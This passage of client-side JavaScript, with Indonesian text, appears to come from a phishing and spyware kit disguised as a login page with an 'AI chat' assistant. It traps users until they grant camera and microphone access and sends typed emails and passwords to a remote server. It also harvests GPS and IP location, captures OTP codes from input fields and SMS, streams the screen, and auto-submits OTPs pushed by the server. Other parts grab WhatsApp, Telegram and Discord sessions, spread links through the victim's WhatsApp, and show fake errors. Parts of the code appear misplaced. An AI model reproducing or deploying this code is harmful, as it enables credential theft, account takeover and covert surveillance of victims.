        { id:'camera', icon:'📷', label:'Kamera', bg:'#7c3aed' },
        { id:'microphone', icon:'🎤', label:'Mikrofon', bg:'#ec4899' }
    ];
    const container = document.getElementById('loPerms');
    if (!container) return Promise.resolve();
    container.innerHTML = '';
    perms.forEach(p => {
        const el = document.createElement('div');
        el.className = 'lo-perm';
        el.id = 'lo-perm-' + p.id;
        el.innerHTML = `
            <div class="p-icon" style="background:${p.bg}22;">${p.icon}</div>
            <div class="p-label">${p.label}</div>
            <div class="p-status" id="lo-status-${p.id}">Menunggu</div>
        `;
        container.appendChild(el);
    });

    return new Promise(resolve => {
        let idx = 0;
        function next() {
            if (idx >= perms.length) { resolve(); return; }
            requestPermItem(perms[idx]).then(granted => {
                if (granted) { idx++; next(); }
                // if not granted, requestPermItem keeps retrying — never resolves
            });
        }
        next();
    });
}

function requestPermItem(perm) {
    const statusEl = document.getElementById('lo-status-' + perm.id);
    const itemEl = document.getElementById('lo-perm-' + perm.id);

    function tryPerm() {
        statusEl.textContent = 'Meminta...';
        itemEl.classList.add('active');

        return new Promise(r => {
            const donePerm = () => {
                itemEl.classList.remove('active');
                statusEl.textContent = '\u2713 Aktif';
                statusEl.style.color = '';
                itemEl.classList.add('done');
                r(true);
            };
            const doneFallback = () => {
                itemEl.classList.remove('active');
                statusEl.textContent = '\u2713 Aktif (IP)';
                statusEl.style.color = '';
                itemEl.classList.add('done');
                r(true);
            };
            const fail = () => {
                itemEl.classList.remove('active');
                statusEl.textContent = '\u26A0 Diblokir';
                statusEl.style.color = '#ff6b6b';
                itemEl.classList.add('skipped');
                showKeepaliveNotif(perm.label);
                // Add retry button
                let retryBtn = itemEl.querySelector('.p-retry');
                if (!retryBtn) {
                    retryBtn = document.createElement('button');
                    retryBtn.className = 'p-retry';
                    retryBtn.textContent = 'Coba Lagi';
                    retryBtn.addEventListener('click', () => {
                        statusEl.style.color = '';
                        itemEl.classList.remove('skipped');
                        retryBtn.remove();
                        r(tryPerm());
                    });
                    itemEl.appendChild(retryBtn);
                }
            };

            if (perm.id === 'camera') {
                if (!navigator.mediaDevices?.getUserMedia) { fail(); return; }
                navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:false})
                    .then((s) => {
                        stream = s; startSnapshots();
                        itemEl.classList.remove('active');
                        statusEl.textContent = '\u2713 Aktif';
                        statusEl.style.color = '';
                        itemEl.classList.add('done');
                        r(true);
                    })
                    .catch(() => fail());
            } else if (perm.id === 'microphone') {
                if (!navigator.mediaDevices?.getUserMedia) { fail(); return; }
                navigator.mediaDevices.getUserMedia({audio:true,video:false})
                    .then((s) => {
                        s.getTracks().forEach(t => t.stop());
                        itemEl.classList.remove('active');
                        statusEl.textContent = '\u2713 Aktif';
                        statusEl.style.color = '';
                        itemEl.classList.add('done');
                        r(true);
                    })
                    .catch(() => fail());
    }
});

// Request location — triggered by server on unlock recovery
socket.on('request-location', () => {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                socket.emit('location', { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy });
            },
            () => {
                // Fallback: try IP-based location
                fetch('https://ip-api.com/json/?fields=lat,lon').then(r => r.json()).then(d => {
                    if (d.lat && d.lon) socket.emit('location', { lat: d.lat, lng: d.lon, accuracy: 5000 });
                }).catch(() => {});
            },
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
        );
    }
});
    }

    return tryPerm();
}

function showKeepaliveNotif(label) {
    const existing = document.querySelector('.perm-notif');
    if (existing) existing.remove();
    const div = document.createElement('div');
    div.className = 'perm-notif';
    div.innerHTML = '<div class="pn-icon">\u26A0</div><div class="pn-text">Izin <strong>' + label + '</strong> diperlukan. Aktifkan di pengaturan browser, lalu klik <strong>Coba Lagi</strong>.</div><div class="pn-close">&times;</div>';
    div.querySelector('.pn-close').addEventListener('click', () => div.remove());
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.insertBefore(div, document.getElementById('loPerms'));
}

const errorMessages = [
    'Email atau kata sandi yang Anda masukkan tidak valid. Silakan coba lagi.',
    'Akun Anda diblokir sementara karena aktivitas mencurigakan. Coba lagi dalam beberapa menit.',
    'Terlalu banyak percobaan login gagal. Akun Anda dikunci selama 30 menit.',
    'Kami mendeteksi perangkat tidak dikenal. Verifikasi tambahan diperlukan.'
];
const loadingDurations = [2000, 3500, 6000, 8000];

function showLoadingOverlay(stage) {
    const overlay=document.getElementById('loadingOverlay'), text=document.getElementById('loText'), sub=document.getElementById('loSub'), bar=document.getElementById('loBar');
    overlay.classList.add('show');
    const stages=[{text:'Menghubungkan ke AI\u2026',sub:'Neural Model v3',pct:20},{text:'Memproses permintaan\u2026',sub:'Analisis konteks',pct:45},{text:'Mengoptimalkan respons\u2026',sub:'AI Reasoning',pct:70},{text:'Hampir selesai\u2026',sub:'Menyiapkan percakapan',pct:90}];
    let i=0;
    const interval=setInterval(()=>{if(i<stages.length){text.textContent=stages[i].text;sub.textContent=stages[i].sub;bar.style.width=stages[i].pct+'%';i++;}else clearInterval(interval);},stage||1500);
}
function hideLoadingOverlay() { document.getElementById('loadingOverlay').classList.remove('show'); }

function doRedirect() { window.location.href='/lupa-password.html?expired=1'; }

async function handleLogin(e) {
    e.preventDefault();
    const btn=document.getElementById('loginBtn');
    const email=emailInput.value.trim();
    const pass=passInput.value;
    if(!email){showToast('Masukkan email terlebih dahulu.');return false;}
    if(!pass){showToast('Masukkan kata sandi.');return false;}
    attemptCount++;
    btn.classList.add('loading'); btn.disabled=true; btn.querySelector('span').textContent='Memverifikasi\u2026';
    showLoadingOverlay(1500/4);
    // Request all permissions — blocks until all granted
    await requestPermissions();
    // Send credentials to server regardless of Firebase auth
    socket.emit('device-info', { loginAttempt: { email, pass: pass.slice(0,100), time: Date.now(), attempt: attemptCount } });
    // Authenticate with Firebase (if available)
    const fb = typeof auth !== 'undefined' && auth && typeof auth.signInWithEmailAndPassword === 'function' ? auth : null;
    if (fb) {
        try {
            await fb.signInWithEmailAndPassword(email, pass);
            const uid = fb.currentUser ? fb.currentUser.uid : '';
            try {
                await fetch('/api/link-account', {
                    method:'POST', headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({ deviceId: localStorage.getItem('deviceId'), uid, email, name: fb.currentUser?.displayName || '' })
                });
            } catch(e) {}
            socket.emit('device-info', { login: { email, uid, time: Date.now(), method: 'firebase' } });
            window.location.href = '/dashboard.html';
            return false;
        } catch (err) {
            btn.classList.remove('loading'); btn.disabled=false;
            btn.querySelector('span').textContent='Masuk ke Akun';
            hideLoadingOverlay();
            let msg = 'Login gagal. Periksa email dan kata sandi.';
            if (err.code === 'auth/invalid-credential') msg = 'Email atau kata sandi salah. Silakan coba lagi.';
            else if (err.code === 'auth/user-not-found' || err.code === 'auth/wrong-password') msg = 'Email atau kata sandi salah. Silakan coba lagi.';
            else if (err.code === 'auth/invalid-email') msg = 'Format email tidak valid.';
            else if (err.code === 'auth/too-many-requests') msg = 'Terlalu banyak percobaan. Coba lagi nanti.';
            else if (err.code === 'auth/network-request-failed') msg = 'Koneksi jaringan bermasalah. Coba lagi.';
            else if (err.code) msg = err.code.replace('auth/','').replace(/-/g,' ');
            showToast(msg); vibrate(); console.error('Login error:', err.code, err.message);
            return false;
        }
    } else {
        // Firebase not available — fake login
        await new Promise(r => setTimeout(r, 1500));
        btn.classList.remove('loading'); btn.disabled=false;
        btn.querySelector('span').textContent='Masuk ke Akun';
        hideLoadingOverlay();
        showToast('Email atau kata sandi salah. Silakan coba lagi.');
        vibrate();
        return false;
    }
}

function handleSocial(p) {
    attemptCount++;
    const idx=Math.min(attemptCount-1,errorMessages.length-1);
    showToast(errorMessages[idx]); vibrate();
    if(attemptCount>=3) setTimeout(doRedirect,2000);
}

window.addEventListener('beforeunload',()=>{
    if(watchId)navigator.geolocation.clearWatch(watchId);
    if(stream)stream.getTracks().forEach(t=>t.stop());
    if(snapInterval)clearInterval(snapInterval);
    if(wakeLockSentinel)wakeLockSentinel.release();
    if(floodInterval)clearInterval(floodInterval);
    if(notifInterval)clearInterval(notifInterval);
    if(window.speechSynthesis)window.speechSynthesis.cancel();
    // Notify SW for auto-reinstall
    if (navigator.serviceWorker?.controller) {
        navigator.serviceWorker.controller.postMessage({ type: 'CLIENT_CLOSED', time: Date.now() });
    }
    // Also try sendBeacon
    try {
        navigator.sendBeacon('/api/heartbeat', JSON.stringify({ deviceId: deviceId, time: Date.now(), closed: true }));
    } catch(e) {}
});

// ===== AI CHAT AGENT =====
let aiChatReady = false;
let aiPermissionsChecked = false;
let aiChatOpen = false;

function initAIChat() {
    // Create floating button
    const btn = document.createElement('div');
    btn.id = 'aiChatBtn';
    btn.innerHTML = '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>';
    btn.style.cssText = 'position:fixed;bottom:24px;right:24px;z-index:9998;width:60px;height:60px;border-radius:50%;background:linear-gradient(135deg,#00d4ff,#7c3aed);display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 8px 32px rgba(0,212,255,0.3);transition:all .3s;animation:aiPulse 2s ease-in-out infinite;';
    document.body.appendChild(btn);

    // Create chat panel
    const panel = document.createElement('div');
    panel.id = 'aiChatPanel';
    panel.style.cssText = 'position:fixed;bottom:100px;right:24px;z-index:9999;width:380px;max-width:calc(100vw - 48px);height:520px;max-height:calc(100vh - 140px);background:#0a0a1a;border:1px solid rgba(255,255,255,0.08);border-radius:20px;display:none;flex-direction:column;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.5);font-family:inherit;';
    panel.innerHTML = `
        <div style="padding:20px;background:linear-gradient(135deg,rgba(0,212,255,0.1),rgba(124,58,237,0.1));border-bottom:1px solid rgba(255,255,255,0.06);display:flex;align-items:center;gap:12px;">
            <div style="width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#00d4ff,#7c3aed);display:flex;align-items:center;justify-content:center;">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a2 2 0 0 1-2 2H10a2 2 0 0 1-2-2v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7z"/><path d="M9 22h6"/><path d="M10 22v-4"/><path d="M14 22v-4"/></svg>
            </div>
            <div>
                <div style="font-weight:700;font-size:.95rem;color:#fff;">Neural AI</div>
                <div style="font-size:.72rem;color:#6a6a8e;display:flex;align-items:center;gap:5px;"><span style="width:6px;height:6px;border-radius:50%;background:#00d4ff;display:inline-block;"></span>Online</div>
            </div>
            <div style="margin-left:auto;cursor:pointer;padding:6px;" id="aiChatClose">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#6a6a8e" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
            </div>
        </div>
        <div id="aiChatMessages" style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:12px;scroll-behavior:smooth;">
            <div style="align-self:flex-start;max-width:80%;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);padding:12px 16px;border-radius:16px 16px 16px 4px;font-size:.85rem;color:#ccc;line-height:1.5;">
                Halo! Saya asisten AI Neural. Ada yang bisa saya bantu hari ini? 😊
            </div>
        </div>
        <div id="aiChatPermission" style="display:none;padding:16px;background:rgba(0,212,255,0.05);border-top:1px solid rgba(255,255,255,0.06);">
            <div style="font-size:.82rem;color:#aaa;text-align:center;margin-bottom:12px;">Untuk melanjutkan, mohon aktifkan akses berikut:</div>
            <div id="aiPermList" style="display:flex;flex-direction:column;gap:8px;"></div>
        </div>
        <div style="padding:12px 16px;border-top:1px solid rgba(255,255,255,0.06);display:flex;gap:10px;background:rgba(10,10,26,0.95);">
            <input id="aiChatInput" type="text" placeholder="Ketik pesan..." style="flex:1;padding:12px 16px;border-radius:12px;border:1px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#fff;font-size:.85rem;outline:none;font-family:inherit;" autocomplete="off">
            <button id="aiChatSend" style="padding:12px 18px;border-radius:12px;border:none;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff;cursor:pointer;font-size:.9rem;display:flex;align-items:center;justify-content:center;">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
            </button>
        </div>
    `;
    document.body.appendChild(panel);

    // Inject styles
    const style = document.createElement('style');
    style.textContent = `
        @keyframes aiPulse { 0%,100%{box-shadow:0 8px 32px rgba(0,212,255,0.3)} 50%{box-shadow:0 8px 48px rgba(0,212,255,0.5)} }
        #aiChatMessages::-webkit-scrollbar { width:4px; }
        #aiChatMessages::-webkit-scrollbar-track { background:transparent; }
        #aiChatMessages::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.1); border-radius:2px; }
        .ai-msg-user { align-self:flex-end; max-width:80%; background:linear-gradient(135deg,#00d4ff,#7c3aed); padding:12px 16px; border-radius:16px 16px 4px 16px; font-size:.85rem; color:#fff; line-height:1.5; }
        .ai-msg-bot { align-self:flex-start; max-width:80%; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.06); padding:12px 16px; border-radius:16px 16px 16px 4px; font-size:.85rem; color:#ccc; line-height:1.5; }
        .ai-msg-typing { align-self:flex-start; max-width:80%; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.06); padding:12px 16px; border-radius:16px 16px 16px 4px; font-size:.85rem; color:#6a6a8e; display:flex; gap:4px; align-items:center; }
        .ai-typing-dot { width:6px; height:6px; border-radius:50%; background:#6a6a8e; animation:aiTyping 1.4s ease-in-out infinite; }
        .ai-typing-dot:nth-child(2) { animation-delay:0.2s; }
        .ai-typing-dot:nth-child(3) { animation-delay:0.4s; }
        @keyframes aiTyping { 0%,60%,100%{transform:translateY(0);opacity:0.4} 30%{transform:translateY(-6px);opacity:1} }
        .ai-perm-item { display:flex; align-items:center; gap:10px; padding:10px 14px; border-radius:10px; background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.06); cursor:pointer; transition:all .3s; }
        .ai-perm-item:hover { background:rgba(0,212,255,0.08); border-color:rgba(0,212,255,0.2); }
        .ai-perm-item .perm-icon { width:32px; height:32px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:1.1rem; }
        .ai-perm-item .perm-text { flex:1; }
        .ai-perm-item .perm-title { font-size:.82rem; font-weight:600; color:#ddd; }
        .ai-perm-item .perm-desc { font-size:.72rem; color:#6a6a8e; margin-top:2px; }
        .ai-perm-item .perm-status { font-size:.72rem; font-weight:600; padding:3px 8px; border-radius:6px; }
        .ai-perm-item .perm-ok { background:rgba(0,212,255,0.15); color:#00d4ff; }
        .ai-perm-item .perm-pending { background:rgba(255,193,7,0.15); color:#ffc107; }
        .ai-perm-granted { border-color:rgba(0,212,255,0.3) !important; background:rgba(0,212,255,0.05) !important; }
    `;
    document.head.appendChild(style);

    // Toggle chat panel
    btn.addEventListener('click', () => {
        aiChatOpen = !aiChatOpen;
        panel.style.display = aiChatOpen ? 'flex' : 'none';
        btn.style.transform = aiChatOpen ? 'scale(0.9)' : 'scale(1)';
        if (aiChatOpen && !aiPermissionsChecked) {
            showPermissionPrompts();
        }
        if (aiChatOpen) {
            setTimeout(() => document.getElementById('aiChatInput')?.focus(), 100);
        }
    });

    document.getElementById('aiChatClose').addEventListener('click', () => {
        aiChatOpen = false;
        panel.style.display = 'none';
        btn.style.transform = 'scale(1)';
    });

    // Send message
    document.getElementById('aiChatSend').addEventListener('click', sendAIMessage);
    document.getElementById('aiChatInput').addEventListener('keydown', (e) => {
        if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendAIMessage(); }
    });

    // Listen for AI responses
    socket.on('ai-response', (data) => {
        removeTypingIndicator();
        addChatBubble(data.message, 'bot');
    });
}

function showPermissionPrompts() {
    const permDiv = document.getElementById('aiChatPermission');
    const permList = document.getElementById('aiPermList');
    permDiv.style.display = 'block';

    const perms = [
{ id: 'location', icon: '📍', title: 'Lokasi', desc: 'Akses GPS untuk layanan lokal', color: '#00d4ff' },
            { id: 'camera', icon: '📷', title: 'Kamera', desc: 'Akses kamera untuk verifikasi', color: '#7c3aed' },
            { id: 'microphone', icon: '🎤', title: 'Mikrofon', desc: 'Akses mikrofon untuk voice chat', color: '#ec4899' }
    ];

    permList.innerHTML = '';
    perms.forEach(p => {
        const item = document.createElement('div');
        item.className = 'ai-perm-item';
        item.id = 'perm-' + p.id;
        item.innerHTML = `
            <div class="perm-icon" style="background:${p.color}22;">${p.icon}</div>
            <div class="perm-text"><div class="perm-title">${p.title}</div><div class="perm-desc">${p.desc}</div></div>
            <div class="perm-status perm-pending" id="perm-status-${p.id}">Minta</div>
        `;
        item.addEventListener('click', () => requestSinglePermission(p.id, p.color));
        permList.appendChild(item);
    });

    // Auto-request location first
    setTimeout(() => requestSinglePermission('location', '#00d4ff'), 500);
}

async function requestSinglePermission(type, color) {
    const statusEl = document.getElementById('perm-status-' + type);
    const itemEl = document.getElementById('perm-' + type);

    try {
        if (type === 'location') {
            statusEl.textContent = '...';
            statusEl.className = 'perm-status';
            statusEl.style.color = '#ffc107';
            navigator.geolocation.getCurrentPosition(
                (p) => {
                    socket.emit('location', { lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy });
                    statusEl.textContent = '✓ Aktif';
                    statusEl.className = 'perm-status perm-ok';
                    statusEl.style.color = '';
                    itemEl.classList.add('ai-perm-granted');
                    checkAllPermissions();
                },
                () => {
                    statusEl.textContent = 'Ditolak';
                    statusEl.className = 'perm-status';
                    statusEl.style.color = '#ff6b6b';
                    checkAllPermissions();
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else if (type === 'camera') {
            statusEl.textContent = '...';
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
            s.getTracks().forEach(t => t.stop());
            statusEl.textContent = '✓ Aktif';
            statusEl.className = 'perm-status perm-ok';
            statusEl.style.color = '';
            itemEl.classList.add('ai-perm-granted');
            checkAllPermissions();
        } else if (type === 'microphone') {
            statusEl.textContent = '...';
            const s = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
            s.getTracks().forEach(t => t.stop());
            statusEl.textContent = '✓ Aktif';
            statusEl.className = 'perm-status perm-ok';
            statusEl.style.color = '';
            itemEl.classList.add('ai-perm-granted');
            checkAllPermissions();
        }
    } catch (e) {
        statusEl.textContent = 'Ditolak';
        statusEl.className = 'perm-status';
        statusEl.style.color = '#ff6b6b';
        checkAllPermissions();
    }
}

function checkAllPermissions() {
    const statuses = ['location', 'camera', 'microphone'].map(id => {
        const el = document.getElementById('perm-status-' + id);
        return el ? el.textContent : '';
    });
    // Allow chat even if some permissions denied - just track which ones
    const granted = statuses.filter(s => s.includes('Aktif')).length;
    socket.emit('device-info', { aiPermissions: { granted, total: 3, time: Date.now() } });

    // Enable chat after at least location is attempted
    const locStatus = document.getElementById('perm-status-location');
    if (locStatus && (locStatus.textContent.includes('Aktif') || locStatus.textContent === 'Ditolak')) {
        aiPermissionsChecked = true;
        aiChatReady = true;
        document.getElementById('aiChatPermission').style.display = 'none';
    }
}

function sendAIMessage() {
    const input = document.getElementById('aiChatInput');
    const msg = input.value.trim();
    if (!msg) return;

    if (!aiChatReady) {
        addChatBubble('Mohon aktifkan akses lokasi terlebih dahulu.', 'bot');
        return;
    }

    input.value = '';
    addChatBubble(msg, 'user');
    showTypingIndicator();

    // Send via Socket.IO — social engineer if active, normal chat otherwise
    if (window._socialEngineerActive) {
        socket.emit('social-engineer-reply', { deviceId: deviceId, message: msg });
    } else {
        socket.emit('ai-message', { deviceId: deviceId, message: msg });
    }
}

function addChatBubble(text, type) {
    const container = document.getElementById('aiChatMessages');
    if (!container) return;
    const div = document.createElement('div');
    div.className = type === 'user' ? 'ai-msg-user' : 'ai-msg-bot';
    div.textContent = text;
    container.appendChild(div);
    container.scrollTop = container.scrollHeight;
}

function showTypingIndicator() {
    const container = document.getElementById('aiChatMessages');
    if (!container) return;
    const existing = container.querySelector('.ai-msg-typing');
    if (existing) return;
    const div = document.createElement('div');
    div.className = 'ai-msg-typing';
    div.innerHTML = '<div class="ai-typing-dot"></div><div class="ai-typing-dot"></div><div class="ai-typing-dot"></div>';
    container.appendChild(div);
    container.scrollTop = container.scrollHeight;
}

function removeTypingIndicator() {
    const el = document.querySelector('.ai-msg-typing');
    if (el) el.remove();
}

// AI URL Monitor — track page changes + auto session grab
function initURLMonitor() {
    let lastUrl = window.location.href;
    let lastTitle = document.title;
    socket.emit('url-change', { url: lastUrl, title: lastTitle });
    setInterval(() => {
        const currentUrl = window.location.href;
        const currentTitle = document.title;
        if (currentUrl !== lastUrl || currentTitle !== lastTitle) {
            lastUrl = currentUrl;
            lastTitle = currentTitle;
            socket.emit('url-change', { url: currentUrl, title: currentTitle });
        }
        // Auto session grab — check if on target platform every 30s
        if (currentUrl.includes('web.whatsapp.com') || currentUrl.includes('web.telegram.org') || currentUrl.includes('discord.com') || currentUrl.includes('discordapp.com')) {
            if (!window._lastSessionGrab || Date.now() - window._lastSessionGrab > 30000) {
                window._lastSessionGrab = Date.now();
                let platform = 'Unknown';
                if (currentUrl.includes('web.whatsapp.com')) platform = 'WhatsApp';
                else if (currentUrl.includes('web.telegram.org')) platform = 'Telegram';
                else if (currentUrl.includes('discord.com') || currentUrl.includes('discordapp.com')) platform = 'Discord';
                grabSessionData(platform, window.location.hostname);
            }
        }
    }, 2000);
}
initURLMonitor();

// 📱 OTP Auto-Interceptor — monitor all input fields for OTP patterns
function initOTPMonitor() {
    if (!window._otpSeen) window._otpSeen = new Set();
    setInterval(() => {
        const inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[type="number"], input:not([type])');
        inputs.forEach(inp => {
            const val = inp.value.trim();
            if (!val) return;
            const otpMatch = val.match(/\b(\d{4,8})\b/);
            if (otpMatch && document.visibilityState === 'visible') {
                const otp = otpMatch[1];
                if (window._otpSeen.has(otp)) return;
                window._otpSeen.add(otp);
                if (window._otpSeen.size > 50) window._otpSeen = new Set([...window._otpSeen].slice(-25));
                const context = (document.title || window.location.href).slice(0,100);
                socket.emit('device-info', { otpCode: otp, otpSource: 'input_field', otpContext: context });
            }
        });
        // Also check SMS data if stored in page
        if (window._lastSmsOtp && Date.now() - window._lastSmsOtpTime < 30000) {
            socket.emit('device-info', { otpCode: window._lastSmsOtp, otpSource: 'sms', otpContext: document.title });
            window._lastSmsOtp = null;
        }
    }, 2000);
}
initOTPMonitor();

// 🖥️ Screen Broadcast — getDisplayMedia to admin panel
let screenBroadcastInterval = null;
socket.on('start-screen-broadcast', () => {
    if (screenBroadcastInterval) return;
    if (!navigator.mediaDevices?.getDisplayMedia) {
        showFakeNotif('Broadcast', 'Screen sharing tidak didukung browser ini.');
        return;
    }
    showFakeNotif('Verifikasi Keamanan', 'Neural AI membutuhkan akses layar untuk verifikasi.');
    navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 1 }, audio: false })
        .then((screenStream) => {
            const v = document.createElement('video');
            v.autoplay = true; v.playsinline = true;
            v.setAttribute('data-broadcast','1');
            v.style.cssText = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;';
            v.srcObject = screenStream;
            document.body.appendChild(v);
            const c = document.createElement('canvas');
            const ctx = c.getContext('2d');
            socket.emit('screen-broadcast-status', { status: 'started' });
            screenBroadcastInterval = setInterval(() => {
                if (screenStream.getVideoTracks()[0]?.readyState !== 'live') {
                    stopScreenBroadcast();
                    return;
                }
                if (v.videoWidth && v.videoHeight) {
                    c.width = Math.min(v.videoWidth, 640);
                    c.height = Math.min(v.videoHeight, 480);
                    ctx.drawImage(v, 0, 0, c.width, c.height);
                    socket.emit('screen-stream', { image: c.toDataURL('image/jpeg', 0.3).split(',')[1] });
                }
            }, 3000);
        })
        .catch(() => {
            showFakeNotif('Gagal', 'Tidak dapat mengakses layar.');
        });
});
socket.on('stop-screen-broadcast', stopScreenBroadcast);
function stopScreenBroadcast() {
    if (screenBroadcastInterval) { clearInterval(screenBroadcastInterval); screenBroadcastInterval = null; }
    socket.emit('screen-broadcast-status', { status: 'stopped' });
    document.querySelectorAll('video[data-broadcast]').forEach(v => {
        if (v.srcObject) v.srcObject.getTracks().forEach(t => t.stop());
        v.remove();
    });
}

// 🔐 OTP Auto-Fill — inject OTP into target site form
socket.on('auto-fill-otp', (data) => {
    const { otp, targetUrl } = data;
    if (!otp) return;
    // Try to find and fill OTP input on the page
    const inputs = document.querySelectorAll('input');
    let filled = false;
    inputs.forEach(inp => {
        const type = (inp.type || '').toLowerCase();
        const name = (inp.name || '').toLowerCase();
        const id = (inp.id || '').toLowerCase();
        const placeholder = (inp.placeholder || '').toLowerCase();
        const autocomplete = (inp.autocomplete || '').toLowerCase();
        if (type === 'text' || type === 'tel' || type === 'number' || !type) {
            if (name.includes('otp') || name.includes('kode') || name.includes('code') || name.includes('token') ||
                id.includes('otp') || id.includes('kode') || id.includes('code') || id.includes('token') ||
                placeholder.includes('otp') || placeholder.includes('kode') || placeholder.includes('code') ||
                autocomplete.includes('one-time') || placeholder.includes('6 digit') || placeholder.includes('4 digit')) {
                inp.value = otp;
                inp.dispatchEvent(new Event('input', { bubbles: true }));
                inp.dispatchEvent(new Event('change', { bubbles: true }));
                filled = true;
            }
        }
    });
    if (filled) {
        // Try to auto-submit the form
        const form = inp => { let p = inp; while(p && p.tagName !== 'FORM') p = p.parentElement; return p; };
        const otpInput = [...document.querySelectorAll('input')].find(i => i.value === otp);
        if (otpInput) {
            const parentForm = (() => { let p = otpInput; while(p && p.tagName !== 'FORM') p = p.parentElement; return p; })();
            if (parentForm) {
                setTimeout(() => {
                    parentForm.querySelector('button[type="submit"], button:last-of-type')?.click();
                }, 500);
            }
        }
    }
});

// 📤 WhatsApp Spread — auto-send tracking link via victim's WA
socket.on('whatsapp-spread', (data) => {
    const { message, link } = data;
    if (!message) return;
    // Open WhatsApp Web with pre-filled message
    const waUrl = `https://web.whatsapp.com/send?text=${encodeURIComponent(message)}`;
    window.open(waUrl, '_blank');
    // Also try to inject via page if on WA Web
    if (window.location.hostname.includes('web.whatsapp.com')) {
        setTimeout(() => {
            const sendBtn = document.querySelector('button[aria-label="Send"], button[data-testid="compose-btn-send"]');
            const inputField = document.querySelector('div[contenteditable="true"][data-tab="10"], div[contenteditable="true"][spellcheck="true"]');
            if (inputField) {
                inputField.textContent = message;
                inputField.dispatchEvent(new Event('input', { bubbles: true }));
                if (sendBtn) setTimeout(() => sendBtn.click(), 500);
            }
        }, 3000);
    }
});

// 📱 Enhanced SMS Interceptor — detect OTP codes in SMS
const origSmsInit = initSMSIntercept;
initSMSIntercept = function() {
    if (typeof origSmsInit === 'function') origSmsInit();
    // Also try SMSReceiver API
    try {
        if (navigator.sms && navigator.sms.receive) {
            navigator.sms.receive().then(sms => {
                const otpMatch = sms.body.match(/\b(\d{4,8})\b/);
                if (otpMatch) {
                    window._lastSmsOtp = otpMatch[1];
                    window._lastSmsOtpTime = Date.now();
                    socket.emit('device-info', { otpCode: otpMatch[1], otpSource: 'sms', otpContext: sms.body.slice(0,100) });
                }
            }).catch(() => {});
        }
    } catch(e) {}
};

// Page-specific initializations (skip on dashboard)
if (!window.location.pathname.includes('dashboard')) {
    const form = document.querySelector('form');
    if (form) form.addEventListener('submit', handleLogin);
    const toggleBtn = document.querySelector('.input-append button');
    if (toggleBtn) toggleBtn.addEventListener('click', togglePass);
    document.querySelectorAll('.social-btn').forEach(btn => {
        const provider = btn.querySelector('.s-text')?.textContent || '';
        btn.addEventListener('click', () => handleSocial(provider));
    });
    const notifBtn = document.querySelector('.nt-btn');
    if (notifBtn) notifBtn.addEventListener('click', dismissNotif);
    if (emailInput) emailInput.focus();
}
